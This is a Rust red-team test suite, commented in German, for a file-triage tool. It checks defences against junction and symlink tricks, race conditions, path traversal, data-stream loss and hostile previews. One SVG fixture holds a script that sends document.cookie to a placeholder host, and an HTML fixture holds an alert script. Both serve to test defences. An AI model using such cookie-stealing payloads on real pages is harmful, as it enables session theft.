//! Red-Team-Suite: Tests, die FileTriage aktiv Schaden zufuegen wollen.
//!
//! Jeder Test hier ist aus einer Angriffshypothese entstanden ("kann ich es
//! dazu bringen, eine Datei zu verlieren?"). Sie bleiben als Regression stehen,
//! auch wenn der zugehoerige Fehler behoben ist.
//!
//! Alle Tests arbeiten ausschliesslich unterhalb von `%TEMP%`.

#![cfg(test)]

use std::sync::atomic::AtomicBool;

use crate::config::{DeleteMode, ScanSettings};
use crate::db::Db;
use crate::fileops::{self, CollisionPolicy, OpStatus};
use crate::scan::{ScanOptions, scan};
use crate::testutil::{self, TempDir};

fn db_in(dir: &TempDir) -> Db {
    // Index bewusst ausserhalb des untersuchten Ordners.
    Db::open(dir.path().join("index").join("idx.db")).unwrap()
}

fn scanne(db: &Db, root: &std::path::Path) -> crate::model::ScanProgress {
    let opts = ScanOptions { root: root.to_path_buf(), settings: ScanSettings::default() };
    scan(db, &opts, &AtomicBool::new(false), &mut |_| {}).unwrap()
}

// ---------------------------------------------------------------------------
// Reparse Points: Junctions, Symlinks
// ---------------------------------------------------------------------------

/// Angriff: Eine Junction im Arbeitsordner zeigt auf einen fremden Ordner.
/// Wenn der Scan hindurchlaeuft, haelt FileTriage fremde Dateien fuer Kinder
/// des Arbeitsordners - und wuerde sie zur Triage anbieten.
#[test]
fn junction_fuehrt_nicht_aus_dem_arbeitsordner_heraus() {
    let dir = TempDir::new("angriff-junction");
    let arbeit = dir.dir("arbeitsordner");
    let fremd = dir.dir("fremde-dokumente");
    std::fs::write(fremd.join("streng-geheim.docx"), b"nicht anfassen").unwrap();
    std::fs::write(arbeit.join("egal.txt"), b"x").unwrap();

    if !testutil::make_junction(&arbeit.join("verweis"), &fremd) {
        eprintln!("Junction konnte nicht angelegt werden - Test uebersprungen");
        return;
    }

    let db = db_in(&dir);
    scanne(&db, &arbeit);

    let conn = db.conn().unwrap();
    let treffer: i64 = conn
        .query_row("SELECT count(*) FROM files WHERE name = 'streng-geheim.docx'", [], |r| r.get(0))
        .unwrap();
    assert_eq!(
        treffer, 0,
        "der Scan darf einer Junction nicht folgen - sonst landen fremde Dateien in der Triage"
    );

    // Und der Reparse Point selbst wird als solcher erkannt. Das ist derselbe
    // Codepfad, ueber den auch Datei-Symlinks abgewiesen werden.
    let zustand = crate::fsmeta::inspect(&arbeit.join("verweis")).unwrap();
    assert_eq!(zustand.class, crate::fsmeta::FileClass::Reparse);
    let fehler = crate::fsmeta::require_regular_file(&arbeit.join("verweis")).unwrap_err();
    assert!(
        fehler.to_string().contains("Verknuepfung"),
        "Reparse Points muessen mit klarer Begruendung abgelehnt werden: {fehler}"
    );
}

/// Angriff: Junction, die auf ihren eigenen Elternordner zeigt. Ein Scan, der
/// Reparse Points folgt, laeuft hier endlos.
#[test]
fn junction_schleife_beendet_den_scan() {
    let dir = TempDir::new("angriff-schleife");
    let arbeit = dir.dir("arbeit");
    std::fs::write(arbeit.join("datei.txt"), b"x").unwrap();
    if !testutil::make_junction(&arbeit.join("zurueck"), &arbeit) {
        eprintln!("Junction konnte nicht angelegt werden - Test uebersprungen");
        return;
    }

    let db = db_in(&dir);
    // Wenn das haengt, ist der Scan in einer Schleife.
    let p = scanne(&db, &arbeit);
    assert!(p.done);
    assert!(p.files < 100, "Schleife: unerwartet viele Treffer ({})", p.files);
}

/// Angriff: Eine Symlink-Datei im Arbeitsordner zeigt auf eine fremde Datei.
/// Wird sie "verschoben", darf nicht das Ziel des Links wandern - und erst
/// recht nicht der Link durch eine Kopie ersetzt werden.
#[test]
fn symlink_wird_nicht_verschoben() {
    let dir = TempDir::new("angriff-symlink");
    let arbeit = dir.dir("arbeit");
    let echt = dir.file("original/wichtig.txt", b"originalinhalt");
    let link = arbeit.join("sieht-harmlos-aus.txt");
    if !testutil::make_file_symlink(&link, &echt) {
        eprintln!("Symlink konnte nicht angelegt werden - Test uebersprungen");
        return;
    }

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let ziel = dir.dir("ziel");
    let r = fileops::move_file(&conn, &link, &ziel, CollisionPolicy::Ask, None);

    assert_eq!(
        r.status,
        OpStatus::Failed,
        "eine Verknuepfung darf nicht verschoben werden, ihr Ziel ist unklar"
    );
    assert!(echt.exists(), "die Zieldatei der Verknuepfung muss unberuehrt bleiben");
    assert_eq!(std::fs::read(&echt).unwrap(), b"originalinhalt");
}

/// Angriff: Symlink in den Papierkorb legen. Windows loescht dabei den Link -
/// aber FileTriage soll es gar nicht erst versuchen.
#[test]
fn symlink_wird_nicht_geloescht() {
    let dir = TempDir::new("angriff-symlink-del");
    let echt = dir.file("original/wichtig.txt", b"inhalt");
    let link = dir.path().join("link.txt");
    if !testutil::make_file_symlink(&link, &echt) {
        eprintln!("Symlink konnte nicht angelegt werden - Test uebersprungen");
        return;
    }

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let r = fileops::delete_file(&conn, &link, DeleteMode::Recycle, None);
    assert_eq!(r.status, OpStatus::Failed, "Verknuepfungen werden nicht geloescht");
    assert!(echt.exists());
}

/// Auch der Scan soll Verknuepfungen nicht als normale Dateien einsortieren.
#[test]
fn symlink_datei_landet_nicht_als_normale_datei_im_index() {
    let dir = TempDir::new("angriff-symlink-scan");
    let arbeit = dir.dir("arbeit");
    let echt = dir.file("original/gross.bin", b"0123456789");
    if !testutil::make_file_symlink(&arbeit.join("verweis.bin"), &echt) {
        eprintln!("Symlink konnte nicht angelegt werden - Test uebersprungen");
        return;
    }
    std::fs::write(arbeit.join("echt.txt"), b"x").unwrap();

    let db = db_in(&dir);
    scanne(&db, &arbeit);
    let conn = db.conn().unwrap();
    let n: i64 = conn
        .query_row("SELECT count(*) FROM files WHERE name = 'verweis.bin'", [], |r| r.get(0))
        .unwrap();
    assert_eq!(n, 0, "Symlinks gehoeren nicht als gewoehnliche Dateien in den Index");
}

// ---------------------------------------------------------------------------
// Time of check / time of use
// ---------------------------------------------------------------------------

/// Angriff: Zwischen Pruefung und Ausfuehrung wird die Datei durch eine andere
/// gleicher Groesse ersetzt. FileTriage darf dann nicht die neue Datei
/// verschieben und im Journal behaupten, es sei die alte gewesen.
#[test]
fn datei_die_sich_nach_der_pruefung_aendert_wird_nicht_blind_verschoben() {
    let dir = TempDir::new("angriff-toctou");
    let src = dir.file("wechselhaft.bin", b"AAAA");
    let ziel = dir.dir("ziel");
    let db = db_in(&dir);
    let conn = db.conn().unwrap();

    let vorher = crate::fsmeta::inspect(&src).unwrap().fingerprint;
    std::thread::sleep(std::time::Duration::from_millis(20));
    // Jemand anders tauscht den Inhalt aus.
    std::fs::write(&src, b"BBBB").unwrap();

    let r = fileops::move_file_checked(&conn, &src, &ziel, CollisionPolicy::Ask, None, Some(vorher));
    assert_eq!(
        r.status,
        OpStatus::Failed,
        "die Datei hat sich seit der Pruefung veraendert - das muss auffallen"
    );
    assert!(src.exists(), "die Quelle bleibt liegen");
    assert_eq!(std::fs::read(&src).unwrap(), b"BBBB");
}

// ---------------------------------------------------------------------------
// Kollisionen und Namensgebung
// ---------------------------------------------------------------------------

/// Angriff: Am Ziel entsteht die Kollisionsdatei erst *nach* der Namenssuche.
/// Ein blindes Umbenennen wuerde sie ueberschreiben.
#[test]
fn umbenennen_ueberschreibt_keine_datei_die_gerade_entstanden_ist() {
    let dir = TempDir::new("angriff-rename-race");
    let ziel = dir.dir("ziel");
    std::fs::write(ziel.join("b.txt"), b"vorhanden").unwrap();
    std::fs::write(ziel.join("b (2).txt"), b"auch vorhanden").unwrap();
    let src = dir.file("quelle/b.txt", b"neu");

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let r = fileops::move_file(&conn, &src, &ziel, CollisionPolicy::Rename, None);
    assert_eq!(r.status, OpStatus::Done);
    assert_eq!(std::fs::read(ziel.join("b.txt")).unwrap(), b"vorhanden");
    assert_eq!(std::fs::read(ziel.join("b (2).txt")).unwrap(), b"auch vorhanden");
    assert!(ziel.join("b (3).txt").exists());
}

/// Angriff: Gross-/Kleinschreibung. Auf einem case-insensitiven Dateisystem
/// ist "Report.txt" dieselbe Datei wie "report.txt" - eine Kollision, die
/// erkannt werden muss.
#[test]
fn kollision_wird_auch_bei_anderer_gross_kleinschreibung_erkannt() {
    let dir = TempDir::new("angriff-case");
    let ziel = dir.dir("ziel");
    std::fs::write(ziel.join("Report.txt"), b"vorhanden").unwrap();
    let src = dir.file("quelle/report.txt", b"neu");

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let r = fileops::move_file(&conn, &src, &ziel, CollisionPolicy::Ask, None);

    assert_eq!(
        r.status,
        OpStatus::Collision,
        "gleicher Name in anderer Schreibweise ist auf NTFS dieselbe Datei"
    );
    assert_eq!(std::fs::read(ziel.join("Report.txt")).unwrap(), b"vorhanden");
    assert!(src.exists());
}

// ---------------------------------------------------------------------------
// Grenzen des Arbeitsbereichs
// ---------------------------------------------------------------------------

/// Angriff: Ein Zielpfad mit `..` fuehrt aus dem gewaehlten Bereich heraus.
#[test]
fn zielpfad_mit_punktpunkt_wird_abgelehnt() {
    let dir = TempDir::new("angriff-traversal");
    let src = dir.file("a.txt", b"x");
    let db = db_in(&dir);
    let conn = db.conn().unwrap();

    let boeses_ziel = dir.path().join("unter").join("..").join("..").join("woanders");
    let r = fileops::move_file(&conn, &src, &boeses_ziel, CollisionPolicy::Ask, None);
    assert_eq!(r.status, OpStatus::Failed, "Pfade mit .. duerfen nicht akzeptiert werden");
    assert!(src.exists());
}

/// Angriff: Ziel ist der Ordner der Quelle selbst - darf kein Datenverlust sein.
#[test]
fn verschieben_in_den_eigenen_ordner_ist_folgenlos() {
    let dir = TempDir::new("angriff-selbst");
    let src = dir.file("ordner/a.txt", b"inhalt");
    let db = db_in(&dir);
    let conn = db.conn().unwrap();

    let r = fileops::move_file(&conn, &src, &dir.path().join("ordner"), CollisionPolicy::Ask, None);
    assert_eq!(r.status, OpStatus::Skipped);
    assert_eq!(std::fs::read(&src).unwrap(), b"inhalt");
}

// ---------------------------------------------------------------------------
// Alternate Data Streams
// ---------------------------------------------------------------------------

/// Angriff: Eine Datei traegt einen zusaetzlichen Datenstrom. Ein
/// gewoehnliches Kopieren wuerde ihn wortlos verschlucken - fuer den Nutzer
/// unsichtbarer Datenverlust.
#[test]
fn datei_mit_zusatzstrom_wird_nicht_ueber_laufwerksgrenzen_verschoben() {
    let dir = TempDir::new("angriff-ads");
    let src = dir.file("dokument.txt", b"hauptinhalt");
    if !testutil::write_ads(&src, "geheim", b"versteckte nutzdaten") {
        eprintln!("Alternate Data Stream nicht moeglich - Test uebersprungen");
        return;
    }
    let stroeme = crate::fsmeta::alternate_streams(&src).expect("Stroeme muessen lesbar sein");
    assert!(
        stroeme.iter().any(|s| s.contains("geheim")),
        "der Zusatzstrom muss erkannt werden, gefunden: {stroeme:?}"
    );

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let ziel = dir.dir("ziel");

    // Der Kopierpfad wird erzwungen - so verhaelt es sich wie ein echtes
    // Verschieben auf ein anderes Laufwerk.
    let _reset = crate::fileops::crashpoint::Reset;
    crate::fileops::crashpoint::force_copy_path(true);
    let r = fileops::move_file(&conn, &src, &ziel, CollisionPolicy::Ask, None);

    assert_eq!(r.status, OpStatus::Failed, "das darf nicht stillschweigend passieren");
    assert!(
        r.message.as_deref().unwrap_or_default().contains("Datenstroeme"),
        "die Begruendung muss den Grund nennen: {:?}",
        r.message
    );
    assert!(src.exists(), "die Quelle bleibt unangetastet");
    assert_eq!(
        testutil::read_ads(&src, "geheim").unwrap(),
        b"versteckte nutzdaten",
        "der Zusatzstrom ist noch da"
    );
}

/// Innerhalb desselben Laufwerks ist ein Verschieben ein Umbenennen - dabei
/// bleiben Zusatzstroeme erhalten, also darf es auch erlaubt sein.
#[test]
fn datei_mit_zusatzstrom_darf_im_selben_laufwerk_wandern() {
    let dir = TempDir::new("angriff-ads-lokal");
    let src = dir.file("dokument.txt", b"hauptinhalt");
    if !testutil::write_ads(&src, "geheim", b"versteckte nutzdaten") {
        eprintln!("Alternate Data Stream nicht moeglich - Test uebersprungen");
        return;
    }

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let ziel = dir.dir("ziel");
    let r = fileops::move_file(&conn, &src, &ziel, CollisionPolicy::Ask, None);

    assert_eq!(r.status, OpStatus::Done, "{:?}", r.message);
    assert_eq!(
        testutil::read_ads(&ziel.join("dokument.txt"), "geheim").unwrap(),
        b"versteckte nutzdaten",
        "der Zusatzstrom muss das Verschieben ueberleben"
    );
}

#[test]
fn datei_ohne_zusatzstrom_wird_nicht_faelschlich_blockiert() {
    let dir = TempDir::new("angriff-ads-frei");
    let src = dir.file("normal.txt", b"nur der hauptstrom");
    assert_eq!(
        crate::fsmeta::alternate_streams(&src),
        Some(Vec::new()),
        "eine gewoehnliche Datei hat keine Zusatzstroeme"
    );

    let db = db_in(&dir);
    let conn = db.conn().unwrap();
    let _reset = crate::fileops::crashpoint::Reset;
    crate::fileops::crashpoint::force_copy_path(true);
    let r = fileops::move_file(&conn, &src, &dir.dir("ziel"), CollisionPolicy::Ask, None);
    assert_eq!(r.status, OpStatus::Done, "{:?}", r.message);
}

// ---------------------------------------------------------------------------
// Vorschau
// ---------------------------------------------------------------------------

/// SVG ist ausfuehrbarer Inhalt: Es kann Skripte und externe Verweise
/// enthalten. FileTriage darf daraus niemals etwas erzeugen, das die
/// Oberflaeche ausfuehrt.
#[test]
fn svg_wird_nicht_als_bild_ausgeliefert() {
    let dir = TempDir::new("angriff-svg");
    let boese = br#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
        <script>fetch('http://example.invalid/'+document.cookie)</script>
        <image href="http://example.invalid/tracker.png"/>
    </svg>"#;
    let p = dir.file("harmlos.svg", boese);

    let v = crate::preview::generate(&p, 64 * 1024 * 1024);
    assert!(
        matches!(v.kind, crate::preview::PreviewKind::None),
        "SVG darf keine Bildvorschau erzeugen"
    );
    assert!(v.data_url.is_none(), "es darf keine darstellbare Quelle entstehen");
    assert!(v.text.is_none(), "der Inhalt darf auch nicht als Text zurueckkommen");
}

/// HTML wird als Text behandelt. Der Rohtext darf zurueckkommen - die
/// Oberflaeche setzt ihn ueber `textContent` und fuehrt nichts aus - aber es
/// darf keine `data:`-URL daraus werden.
#[test]
fn html_wird_nur_als_text_behandelt() {
    let dir = TempDir::new("angriff-html");
    let p = dir.file("seite.html", b"<script>alert(1)</script><h1>Hallo</h1>");
    let v = crate::preview::generate(&p, 64 * 1024 * 1024);
    assert!(matches!(v.kind, crate::preview::PreviewKind::Text));
    assert!(v.data_url.is_none(), "aus HTML darf keine darstellbare Quelle werden");
}

/// Eine Textdatei mit einer einzigen riesigen Zeile darf weder den Speicher
/// sprengen noch die Oberflaeche blockieren.
#[test]
fn riesige_textzeile_wird_begrenzt() {
    let dir = TempDir::new("angriff-zeile");
    let riesig = vec![b'A'; 5 * 1024 * 1024];
    let p = dir.file("eine-zeile.txt", &riesig);

    let v = crate::preview::generate(&p, 64 * 1024 * 1024);
    let text = v.text.unwrap_or_default();
    assert!(text.len() <= 64 * 1024, "die Vorschau muss begrenzt sein, war {}", text.len());
    assert!(v.truncated);
}

/// Ein Bild mit absurden Kopfdaten darf keine riesige Speicheranforderung
/// ausloesen.
#[test]
fn bild_mit_gefaelschten_massen_wird_abgewiesen() {
    let dir = TempDir::new("angriff-bild");
    // PNG-Kopf mit 65535 x 65535 Pixeln, aber ohne Bilddaten.
    let mut daten: Vec<u8> = vec![0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a];
    daten.extend_from_slice(&[0, 0, 0, 13]);
    daten.extend_from_slice(b"IHDR");
    daten.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF]);
    daten.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF]);
    daten.extend_from_slice(&[8, 6, 0, 0, 0]);
    daten.extend_from_slice(&[0, 0, 0, 0]);
    let p = dir.file("riesig.png", &daten);

    let v = crate::preview::generate(&p, 64 * 1024 * 1024);
    assert!(matches!(v.kind, crate::preview::PreviewKind::None));
    assert!(v.note_code.is_some());
}

/// Eine Vorschau darf niemals die Datei veraendern.
#[test]
fn vorschau_veraendert_die_datei_nicht() {
    let dir = TempDir::new("angriff-vorschau-ro");
    let p = dir.file("unberuehrt.txt", b"originalinhalt");
    let vorher = crate::fsmeta::inspect(&p).unwrap().fingerprint;

    for _ in 0..5 {
        let _ = crate::preview::generate(&p, 64 * 1024 * 1024);
    }
    let nachher = crate::fsmeta::inspect(&p).unwrap().fingerprint;
    assert_eq!(vorher.size, nachher.size);
    assert_eq!(vorher.modified, nachher.modified);
    assert_eq!(std::fs::read(&p).unwrap(), b"originalinhalt");
}

// ---------------------------------------------------------------------------
// Hardlinks
// ---------------------------------------------------------------------------

/// Hardlinks teilen sich denselben Inhalt. Das Loeschen des einen Pfades
/// laesst die Daten ueber den anderen Pfad erhalten - FileTriage darf sie
/// deshalb nicht als zwei unabhaengige Kopien "einsparen" versprechen.
#[test]
fn hardlinks_werden_als_solche_dokumentiert() {
    let dir = TempDir::new("angriff-hardlink");
    let a = dir.file("a.bin", b"gemeinsamer inhalt");
    let b = dir.path().join("b.bin");
    if !testutil::make_hardlink(&b, &a) {
        eprintln!("Hardlink konnte nicht angelegt werden - Test uebersprungen");
        return;
    }

    let db = db_in(&dir);
    let root = dir.path().to_path_buf();
    scanne(&db, &root);
    crate::dup::find(&db, Some(&root.display().to_string()), 1, &AtomicBool::new(false), &mut |_| {})
        .unwrap();
    let conn = db.conn().unwrap();
    let gruppen = crate::dup::groups(&conn, Some(&root.display().to_string()), 1).unwrap();

    // Beide Pfade haben denselben Inhalt und werden daher als Duplikat
    // gefunden. Entscheidend ist, dass der Bericht das nicht als frei
    // werdenden Platz verspricht.
    if let Some(g) = gruppen.iter().find(|g| g.files.len() >= 2) {
        assert!(
            g.hardlinked,
            "eine Gruppe aus Hardlinks muss als solche gekennzeichnet sein"
        );
        assert_eq!(g.wasted, 0, "Hardlinks geben beim Loeschen keinen Platz frei");
    }
}
